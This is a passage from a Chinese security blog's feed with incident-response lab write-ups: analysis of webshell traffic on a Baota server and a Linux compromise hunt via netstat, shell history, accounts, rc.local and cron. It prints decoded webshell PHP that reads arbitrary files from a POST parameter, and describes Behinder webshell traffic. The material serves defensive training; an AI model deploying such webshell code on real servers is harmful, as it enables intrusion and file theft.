<span class="comment">// 删除临时目录</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于编码输出</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数用于输出内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>(); <span class="comment">// 获取输出缓冲区内容</span></span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>(); <span class="comment">// 清空并关闭输出缓冲区</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b6&quot;</span> . <span class="string">&quot;887&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>); <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f405&quot;</span> . <span class="string">&quot;72be7&quot;</span>; <span class="comment">// 输出固定的标识符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(); <span class="comment">// 开启输出缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 从 POST 请求中读取 base64 编码的文件路径</span></span><br><span class="line">    <span class="variable">$F</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;x0b6b31b98f31d&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$P</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$F</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 打开文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容，并输出</span></span><br><span class="line">    <span class="keyword">echo</span> (@<span class="title function_ invoke__">fread</span>(<span class="variable">$P</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>) ? <span class="title function_ invoke__">filesize</span>(<span class="variable">$F</span>) : <span class="number">4096</span>));</span><br><span class="line">    @<span class="title function_ invoke__">fclose</span>(<span class="variable">$P</span>); <span class="comment">// 关闭文件</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 处理异常并输出错误信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>(); <span class="comment">// 调用输出函数</span></span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">// 结束脚本执行</span></span><br><span class="line">&amp;x0b6b31b98f31d=OmL3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</span><br></pre></td></tr></table></figure><p><code>base64_decode(substr($_POST[&quot;x0b6b31b98f31d&quot;], 2));</code>获取<code>post key</code> <code>x0b6b31b98f31d</code>的值,然后从第二个字符串开始截取截取到最后一个也就是<code>L3d3dy93d3dyb290LzEyNy4wLjAuMS9mbGFnMQ==</code>然后<code>base64</code>解码得<code>/www/wwwroot/127.0.0.1/flag1</code>哎呀我去,误打误撞发现一个<code>flag</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426468.png" data-fancybox="true"/></div></div><p>接着看下面的数据流,可以看到黑客访问了此文件,<code>flag1</code>的内容为:<code>flag1&#123;Network@_2020_Hack&#125;</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426666.png" data-fancybox="true"/></div></div><p>再往下看又会发现一个冰蝎马的流量特征</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426136.png" data-fancybox="true"/></div></div><ol><li>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有<code>Connection: Keep-Alive</code></li><li>请求体看起来向一堆<code>Base64</code>编码的内容但是解出来又是乱码,可以找到<code>Webshell</code>取出密钥进行<code>aes</code>解密</li></ol><h2 id="宝塔-Web应急响应"><a href="#宝塔-Web应急响应" class="headerlink" title="宝塔-Web应急响应"></a>宝塔-Web应急响应</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@web-server wwwlogs]<span class="comment"># cd /www/wwwlogs/</span></span><br><span class="line">[root@web-server wwwlogs]<span class="comment"># ll -a</span></span><br><span class="line">总用量 212</span><br><span class="line">drwx-----x 10 www  www     249 3月   7 12:01 .</span><br><span class="line">drwxr-xr-x  7 root root     99 3月   7 11:40 ..</span><br><span class="line">-rwx------  1 www  www   12532 3月  20 08:12 127.0.0.1.error.log</span><br><span class="line">-rwx------  1 www  www   93820 3月  20 15:36 127.0.0.1.<span class="built_in">log</span></span><br><span class="line">-rwx------  1 www  www  102880 3月  20 14:53 access.log</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 go</span><br><span class="line">drwx-----x  3 www  www      24 3月   7 11:40 java</span><br><span class="line">drwx------  3 www  www      17 3月   7 11:47 load_balancing</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 nginx_error.log</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 nodejs</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:40 other</span><br><span class="line">drwx-----x  2 www  www       6 3月   7 11:41 python</span><br><span class="line">drwx------  2 www  www      52 3月  20 08:05 request</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 tcp-access.log</span><br><span class="line">-rwx------  1 www  www       0 3月   7 11:47 tcp-error.log</span><br><span class="line">drwx------  2 www  www       6 3月   7 11:47 waf</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426681.png" data-fancybox="true"/></div></div><p>分析日志,只有两个IP那么<code>192.168.20.1</code>则为攻击IP</p><p>输入<code>bt</code>修改面板密码进入面板,设置网站<code>IP</code></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426924.png" data-fancybox="true"/></div></div><p>没有密码,无法登录后台,去数据库里查一查密码</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426772.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161426686.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407161427150.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux" scheme="https://jiangjiyue.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>应急响应靶机训练-Linux1</title>
    <link href="https://jiangjiyue.github.io/2024/07/16/29554557/"/>
    <id>https://jiangjiyue.github.io/2024/07/16/29554557/</id>
    <published>2024-07-16T04:10:49.000Z</published>
    <updated>2024-07-16T06:34:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 12.28K </p>    </div>    <div class="cell" style="">    <p>代码: 11.40K, 文本: 0.32K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 51 分钟</p>    </div>    </div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前景需要：小王急匆匆地找到小张，小王说”李哥，我dev服务器被黑了”,快救救我！！</p><p>这是他的服务器，请你找出以下内容作为通关条件：</p><ol><li>黑客的IP地址 <psw>192.168.75.129</psw></li><li>黑客遗留下的flag【3个】<ul><li><psw>flag{thisismybaby}</psw></li><li><psw>flag{kfcvme50}</psw></li><li><psw>flag{P@ssW0rd_redis}</psw></li></ul></li></ol><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>使用Vmware启动即可,如启动错误,请升级至Vmware17.5以上</p><p>相关账户密码:</p><ol><li>defend&#x2F;defend</li><li>root&#x2F;defend</li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看运行了哪些服务,有无外联端口</span></span><br><span class="line">[root@localhost ~]<span class="comment"># netstat -atup</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 localhost.locald:domain 0.0.0.0:*               LISTEN      1656/dnsmasq        </span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      1093/sshd           </span><br><span class="line">tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN      1096/cupsd          </span><br><span class="line">tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN      1331/master         </span><br><span class="line">tcp        0      0 0.0.0.0:sunrpc          0.0.0.0:*               LISTEN      749/rpcbind         </span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      1093/sshd           </span><br><span class="line">tcp6       0      0 localhost:ipp           [::]:*                  LISTEN      1096/cupsd          </span><br><span class="line">tcp6       0      0 localhost:smtp          [::]:*                  LISTEN      1331/master         </span><br><span class="line">tcp6       0      0 [::]:sunrpc             [::]:*                  LISTEN      749/rpcbind         </span><br><span class="line">udp        0      0 0.0.0.0:922             0.0.0.0:*                           749/rpcbind         </span><br><span class="line">udp        0      0 0.0.0.0:34003           0.0.0.0:*                           781/avahi-daemon: r </span><br><span class="line">udp        0      0 0.0.0.0:mdns            0.0.0.0:*                           781/avahi-daemon: r </span><br><span class="line">udp        0      0 localhost.locald:domain 0.0.0.0:*                           1656/dnsmasq        </span><br><span class="line">udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           1656/dnsmasq        </span><br><span class="line">udp        0      0 0.0.0.0:sunrpc          0.0.0.0:*                           749/rpcbind         </span><br><span class="line">udp        0      0 localhost:323           0.0.0.0:*                           801/chronyd         </span><br><span class="line">udp6       0      0 [::]:922                [::]:*                              749/rpcbind         </span><br><span class="line">udp6       0      0 [::]:sunrpc             [::]:*                              749/rpcbind         </span><br><span class="line">udp6       0      0 localhost:323           [::]:*                              801/chronyd         </span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152024145.png" data-fancybox="true"/></div></div><h3 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># ll -a /etc/systemd/system/</span></span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x. 20 root root 4096 3月  18 19:24 .</span><br><span class="line">drwxr-xr-x.  4 root root  151 3月  19 03:08 ..</span><br><span class="line">drwxr-xr-x.  2 root root   57 3月  19 03:10 basic.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   31 3月  19 03:08 bluetooth.target.wants</span><br><span class="line">lrwxrwxrwx.  1 root root   41 3月  19 03:08 dbus-org.bluez.service -&gt; /usr/lib/systemd/system/bluetooth.service</span><br><span class="line">lrwxrwxrwx.  1 root root   44 3月  19 03:10 dbus-org.freedesktop.Avahi.service -&gt; /usr/lib/systemd/system/avahi-daemon.service</span><br><span class="line">lrwxrwxrwx.  1 root root   44 3月  19 03:10 dbus-org.freedesktop.ModemManager1.service -&gt; /usr/lib/systemd/system/ModemManager.service</span><br><span class="line">lrwxrwxrwx.  1 root root   57 3月  19 03:08 dbus-org.freedesktop.nm-dispatcher.service -&gt; /usr/lib/systemd/system/NetworkManager-dispatcher.service</span><br><span class="line">lrwxrwxrwx.  1 root root   36 3月  19 03:13 default.target -&gt; /lib/systemd/system/graphical.target</span><br><span class="line">drwxr-xr-x.  2 root root   87 3月  19 03:08 default.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   38 3月  19 03:10 dev-virtio\x2dports-org.qemu.guest_agent.0.device.wants</span><br><span class="line">lrwxrwxrwx.  1 root root   35 3月  19 03:09 display-manager.service -&gt; /usr/lib/systemd/system/gdm.service</span><br><span class="line">drwxr-xr-x.  2 root root   32 3月  19 03:08 getty.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root  133 3月  19 03:15 graphical.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   35 3月  19 03:08 local-fs.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root 4096 3月  18 19:24 multi-user.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   48 3月  19 03:08 network-online.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   26 3月  19 03:09 printer.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   24 3月  18 19:19 redis-sentinel.service.d</span><br><span class="line">drwxr-xr-x.  2 root root   24 3月  18 19:19 redis.service.d</span><br><span class="line">drwxr-xr-x.  2 root root   52 3月  19 03:09 remote-fs.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root  188 3月  19 03:10 sockets.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root 4096 3月  19 03:10 sysinit.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   44 3月  19 03:08 system-update.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   34 3月  19 03:09 timers.target.wants</span><br><span class="line">drwxr-xr-x.  2 root root   29 3月  19 03:08 vmtoolsd.service.requires</span><br></pre></td></tr></table></figure><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># history </span></span><br><span class="line">   <span class="built_in">ls</span></span><br><span class="line">   <span class="built_in">chmod</span> +x /etc/rc.d/rc.local</span><br><span class="line">   <span class="built_in">cat</span> /etc/rc.d/rc.local</span><br><span class="line">   vim /etc/rc.d/rc.local </span><br><span class="line">   <span class="built_in">echo</span> flag&#123;thisismybaby&#125;</span><br><span class="line">   <span class="built_in">exit</span></span><br><span class="line">   netstat -atup</span><br><span class="line">   <span class="built_in">ls</span> -a /etc/systemd/system/</span><br><span class="line">   <span class="built_in">ls</span> -a /usr/lib/systemd/system</span><br><span class="line">   <span class="built_in">cd</span> /usr/local/</span><br><span class="line">   <span class="built_in">ls</span></span><br><span class="line">   <span class="built_in">cd</span> share/</span><br><span class="line">   <span class="built_in">ls</span></span><br><span class="line">   <span class="built_in">cd</span> /etc/</span><br><span class="line">   <span class="built_in">ls</span></span><br><span class="line">   <span class="built_in">ls</span> -a /usr/lib/systemd/system</span><br><span class="line">   <span class="built_in">ls</span> -a /etc/systemd/system/</span><br><span class="line">   ll -a /etc/systemd/system/</span><br><span class="line">   <span class="built_in">history</span> </span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152024660.png" data-fancybox="true"/></div></div><p>可以发现还执行过<code>vim /etc/rc.d/rc.local</code>命令.应该是开机自启</p><h3 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># cat /etc/passwd |grep -v &quot;nologin&quot;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">defend:x:1000:1000:defend:/home/defend:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 该用户创建时间为 2024年3月18 20:26 </span></span><br><span class="line">[root@localhost defend]<span class="comment"># cd /home/defend/</span></span><br><span class="line">[root@localhost defend]<span class="comment"># ll -a</span></span><br><span class="line">总用量 36</span><br><span class="line">drwx------. 15 defend defend 4096 3月  18 20:26 .</span><br><span class="line">drwxr-xr-x.  3 root   root     20 3月  19 03:13 ..</span><br><span class="line">-rw-------.  1 defend defend    8 3月  18 20:26 .bash_history</span><br><span class="line">-rw-r--r--.  1 defend defend   18 4月   1 2020 .bash_logout</span><br><span class="line">-rw-r--r--.  1 defend defend  193 4月   1 2020 .bash_profile</span><br><span class="line">-rw-r--r--.  1 defend defend  231 4月   1 2020 .bashrc</span><br><span class="line">drwx------. 15 defend defend 4096 3月  19 10:17 .cache</span><br><span class="line">drwxr-xr-x. 14 defend defend  261 3月  19 03:16 .config</span><br><span class="line">drwx------.  3 defend defend   25 3月  19 03:15 .dbus</span><br><span class="line">-rw-r--r--.  1 root   root     77 3月  18 19:45 dump.rdb</span><br><span class="line">-rw-------.  1 defend defend   16 3月  19 03:15 .esd_auth</span><br><span class="line">-rw-------.  1 defend defend  310 3月  19 03:15 .ICEauthority</span><br><span class="line">drwx------.  3 defend defend   19 3月  19 03:15 .<span class="built_in">local</span></span><br><span class="line">drwxr-xr-x.  4 defend defend   39 3月  19 03:07 .mozilla</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 公共</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 模板</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 视频</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 图片</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 文档</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 下载</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 音乐</span><br><span class="line">drwxr-xr-x.  3 defend defend   20 3月  19 10:17 桌面</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152023736.png" data-fancybox="true"/></div></div><p>看该用户相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost defend]<span class="comment"># ll -a</span></span><br><span class="line">总用量 36</span><br><span class="line">drwx------. 15 defend defend 4096 3月  18 20:26 .</span><br><span class="line">drwxr-xr-x.  3 root   root     20 3月  19 03:13 ..</span><br><span class="line">-rw-------.  1 defend defend    8 3月  18 20:26 .bash_history</span><br><span class="line">-rw-r--r--.  1 defend defend   18 4月   1 2020 .bash_logout</span><br><span class="line">-rw-r--r--.  1 defend defend  193 4月   1 2020 .bash_profile</span><br><span class="line">-rw-r--r--.  1 defend defend  231 4月   1 2020 .bashrc</span><br><span class="line">drwx------. 15 defend defend 4096 3月  19 10:17 .cache</span><br><span class="line">drwxr-xr-x. 14 defend defend  261 3月  19 03:16 .config</span><br><span class="line">drwx------.  3 defend defend   25 3月  19 03:15 .dbus</span><br><span class="line">-rw-r--r--.  1 root   root     77 3月  18 19:45 dump.rdb</span><br><span class="line">-rw-------.  1 defend defend   16 3月  19 03:15 .esd_auth</span><br><span class="line">-rw-------.  1 defend defend  310 3月  19 03:15 .ICEauthority</span><br><span class="line">drwx------.  3 defend defend   19 3月  19 03:15 .<span class="built_in">local</span></span><br><span class="line">drwxr-xr-x.  4 defend defend   39 3月  19 03:07 .mozilla</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 公共</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 模板</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 视频</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 图片</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 文档</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 下载</span><br><span class="line">drwxr-xr-x.  2 defend defend    6 3月  19 03:15 音乐</span><br><span class="line">drwxr-xr-x.  3 defend defend   20 3月  19 10:17 桌面</span><br><span class="line">[root@localhost defend]<span class="comment"># cat .bash_history </span></span><br><span class="line"><span class="built_in">history</span></span><br><span class="line">[root@localhost defend]<span class="comment"># cat dump.rdb </span></span><br><span class="line">REDIS0007�redis-ver3.2.12�</span><br><span class="line">redis-bits�@�ctime�l)�eused-mem°�</span><br><span class="line">                                 ���,���</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152023654.png" data-fancybox="true"/></div></div><p>此redis指纹结合上方服务可得本机存在redis服务</p><h3 id="分析开机自启程序"><a href="#分析开机自启程序" class="headerlink" title="分析开机自启程序"></a>分析开机自启程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost etc]<span class="comment"># cat /etc/rc.d/rc*</span></span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc0.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc1.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc2.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc3.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc4.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc5.d: 是一个目录</span><br><span class="line"><span class="built_in">cat</span>: /etc/rc.d/rc6.d: 是一个目录</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It is highly advisable to create own systemd services or udev rules</span></span><br><span class="line"><span class="comment"># to run scripts during boot instead of using this file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In contrast to previous versions due to parallel execution during boot</span></span><br><span class="line"><span class="comment"># this script will NOT be run after all other services.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Please note that you must run &#x27;chmod +x /etc/rc.d/rc.local&#x27; to ensure</span></span><br><span class="line"><span class="comment"># that this script will be executed during boot.</span></span><br><span class="line"><span class="comment"># flag&#123;kfcvme50&#125;</span></span><br><span class="line"><span class="built_in">touch</span> /var/lock/subsys/local</span><br></pre></td></tr></table></figure><h3 id="查看计划或定时任务"><a href="#查看计划或定时任务" class="headerlink" title="查看计划或定时任务"></a>查看计划或定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab </span><br><span class="line"><span class="built_in">cat</span> /etc/cron.d/*</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/root</span><br></pre></td></tr></table></figure><h2 id="Redis应急响应"><a href="#Redis应急响应" class="headerlink" title="Redis应急响应"></a>Redis应急响应</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 